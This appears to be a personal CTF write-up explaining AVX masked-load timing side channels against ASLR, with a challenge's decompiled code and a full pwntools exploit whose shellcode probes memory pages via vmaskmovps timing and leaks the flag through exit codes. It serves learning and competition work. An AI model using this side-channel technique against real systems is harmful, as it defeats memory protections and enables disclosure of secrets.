---
title: "AVX Timing Side-Channel Attacks against Address Space Layout Randomization"
date: 2026-07-21
description: "AVX Timing Side-Channel Attacks against Address Space Layout Randomization"
tags: [pwn, theory, side-channel]
type: note
---

# AVX Timing Side-Channel Attacks against Address Space Layout Randomization


- AVX instruction are SIMD instructions for performing operations on wide vectors of data. generally used to increase performance but also introduces some security vulnerabilities.

- lets talk about them here.

## what are avx instructions and what do they do? 


- AVX is an x86 SIMD extension that adds wide vector registers and instructions for doing the same operation on many data elements in parallel; AVX masked load/store are special memory ops that use a per‑lane mask to conditionally read/write elements, and in this paper they are abused because they can touch arbitrary virtual addresses, suppress faults when lanes are masked out, yet still leak mapping/permission/TLB state through timing. 

- source  : https://en.wikipedia.org/wiki/Advanced_Vector_Extensions


-  if you do `mov rax, [addr]`  from an unmapped address, you get a page fault and the process segfaults; but with AVX masked loads/stores you can issue a memory access to an unmapped or kernel address, mask out all the lanes that would touch that page, and the hardware suppresses the fault while still doing enough work that the total execution time leaks whether the page is mapped, what its permissions are, and whether it was in the TLB.


- https://arxiv.org/pdf/2304.07940
- https://www.felixcloutier.com/x86/vmaskmov

- we can use the vmaskmov instructions to read from arbitrary addresses without causing a fault, by masking out all lanes that would access invalid memory. This allows us to probe the memory layout of a process and get information about its address space layout.


- what we are doing is basically fault suppression using the avx inst.

- lets understand why that happens :


- if the mask : 1 and the address faults - we get a sigsegv
- if mask : 0 and the address faults - we dont get a sigsegv is the jist of the rsrch ppr.

- now how can we use this for CTFs? especially the 0xL4ugh CTF where we are given only exit syscall to interact with the binary and the flag pointer is loaded in a mapped region by using an address from /dev/urandom & `0x??????fffffff0000`


snippet from decomp :
```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    setvbuf(stdin, nullptr, 2, 0);
    setvbuf(__bss_start, nullptr, 2, 0);
    setvbuf(stderr, nullptr, 2, 0);
    int64_t rax_3 = open("/dev/urandom", 0);
    
    if (rax_3 < 0)
    {
        puts("Urandom read error. Please contact wyv3rn!");
        exit(0);
        /* no return */
    }
    
    int64_t buf;
    read(rax_3, &buf, 8);
    close(rax_3);
    int64_t buf_1 = mmap(0xffffff0000 & buf, 0x1000, 3, 0x32, 0, 0);
    int64_t rax_11 = open("./flag", 0);
    
    if (rax_11 < 0)
    {
        puts("Flag read error. Please contact wyv3rn!");
        exit(0);
        /* no return */
    }
    
    read(rax_11, buf_1, 0x32);
    close(rax_11);
    printf("What's up? ");
    memset(&buf, 0, 0x40);
    int64_t buf_2 = mmap(0x100000000000, 0x1000, 7, 0x22, 0, 0);
    read(0, buf_2, 0x1000);
    int64_t rax_17 = seccomp_init(0);
    
    if (!rax_17)
    {
        puts("Seccomp error. Please contact wyv3rn!");
        exit(0);
        /* no return */
    }
    
    if (seccomp_rule_add(rax_17, 0x7fff0000, 0x3c, 0))
    {
        puts("Seccomp rule add error. Please contact wyv3rn!");
        exit(0);
        /* no return */
    }
    
    if (seccomp_load(rax_17))
    {
        puts("Seccomp load error. Please contact wyv3rn!");
        exit(0);
        /* no return */
    }
    
    buf_2();
    *(fsbase + 0x28);
    
    if (rax == *(fsbase + 0x28))
        return 0;
    
    __stack_chk_fail();
    /* no return */
}

```

- we are allowed a shellcode read into a RWX mmaped region at `0x100000000000`
- the flag is mapped at a random address in the high region `0x??????fffffff0000`
- the flag ptr is zeroed out in the stack before the shellcode read. (checked in gdb)

- in the ssh we are given a shell so we can read the exit codes. we dont have sudo so we cant read /proc/*/maps of the process.

- we need to write shellcode that can find the flag address using avx side channel and read it char by char probably since exit codes are limited to 0-255.



--- 

waht i used + explanation : 
```py
from pwn import *

context.arch = 'amd64'
context.aslr = True  

base = "0xL4ugh{"
i = len(base)

while True:
    p = process("./prob")
    p.recvuntil(b"What's up? ")
    
    sc = asm(f'''
    .intel_syntax noprefix
    mov rsi, 0x10000000
    test1:
        add rsi, 0x10000
        vpxor ymm0, ymm0, ymm0
        vmaskmovps ymm0, ymm0, ymmword ptr [rsi]
        mfence
        rdtsc
        mov rcx, rax
        vmaskmovps ymm0, ymm0, ymmword ptr [rsi]
        mfence
        rdtsc
        sub rax, rcx
        cmp rax, 0x90
        ja test1
    get:
        add rsi, {i}
        mov dil, byte ptr [rsi]
        mov rax, 60
        syscall
    ''')
    
    p.sendline(sc)
    try:
        p.recvline()
    except EOFError:
        status = p.poll()
        if status == -11 :
            p.close()
            continue
        else:
            p.close()
            base += chr(status)
            print(base)
            i += 1
            continue
    p.close()



# mov rsi 0x10000000 is our starting base addr for our probe
# then we add to rsi to access next mem page

# xor ymm0 like the article suggests to clears the register and mask the bits to 0

# vmaskmovps will load the data from the addr in rsi to ymm0 register
# even if the mem addr isnt mapped the segfault is suppressedd.
# if we can read the timing of the instruction, we can estimate if the page was mapped or not
# by basically loading twice. if the map exists the second load is cache hit which is very fast. but if its invalid its is always  a cahce miss and takes longer basically.

# mfence serializes all load and store instructions before it. so we get accurate timing
# rdtsc reads the time stamp counter into edx:eax
# we store eax value into rcx for later use.
# we dont need rdx since the timings are very small
# we do the vmaskmovps again to get the second load timing
# mfence again to serialize
# rdtsc again to get the new timestamp
# we subtract the two timestamps to get the delta
# delta we take because if its a valid mem addr the second load will be cached and very fast but if its invalid it will always be a cache miss 
# we test if the delta is greater than 0x90 cycles. we can experiment with the inst cycle value tbh.
# if its greater we loop again to next page
# else we exit the loop and rsi will have the addr of the mapped page
# get assumes the mapped page contains our flag.
# we then add s (length of base string) to rsi to get the next byte of the flag
# next we move into rdi since that is the exit code reg
# set reg for syscall and call syscall

```
